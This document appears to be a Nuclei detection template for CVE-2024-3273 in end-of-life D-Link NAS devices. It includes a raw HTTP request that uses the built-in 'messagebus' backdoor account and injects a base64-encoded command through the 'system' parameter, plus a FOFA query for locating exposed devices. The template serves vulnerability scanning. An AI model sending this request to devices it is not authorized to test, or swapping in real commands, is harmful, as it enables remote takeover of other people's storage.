id: CVE-2024-3273

info:
  name: D-Link Network Attached Storage - Command Injection and Backdoor Account
  author: pussycat0x
  severity: high
  description: |
    UNSUPPORTED WHEN ASSIGNED ** A vulnerability, which was classified as critical, was found in D-Link DNS-320L, DNS-325, DNS-327L and DNS-340L up to 20240403. Affected is an unknown function of the file /cgi-bin/nas_sharing.cgi of the component HTTP GET Request Handler. The manipulation of the argument system leads to command injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-259284. NOTE: This vulnerability only affects products that are no longer supported by the maintainer. NOTE: Vendor was contacted early and confirmed immediately that the product is end-of-life. It should be retired and replaced.
  reference:
    - https://github.com/netsecfish/dlink
    - https://www.bleepingcomputer.com/news/security/over-92-000-exposed-d-link-nas-devices-have-a-backdoor-account/#google_vignette
    - https://news.ycombinator.com/item?id=39960107
    - https://supportannouncement.us.dlink.com/security/publication.aspx?name=SAP10383
    - https://vuldb.com/?ctiid.259284
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
    cvss-score: 7.3
    cve-id: CVE-2024-3273
    cwe-id: CWE-77
    epss-score: 0.00044
    epss-percentile: 0.09057
  metadata:
    verified: true
    fofa-query: app="D_Link-DNS-ShareCenter"
  tags: cve,cve2024,dlink,nas

variables:
  str: "{{rand_base(5)}}"
  payload: "echo {{rand_base(5)}}"

http:
  - raw:
      - |
        GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system={{base64(payload)}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<auth_state>1</auth_state>"
          - "{{str}}"
        condition: and

      - type: status
        status:
          - 200
# digest: 490a0046304402201051515091409a911bb7003c07b4ac549dd7bdde4eba0bc339edc8f7f495485002203ac09ae5a06c7b10a373faa8c1e39287b0abcbb5650c7cf500b5d5b6f81fa211:922c64590222798bb761d5b6d8e72950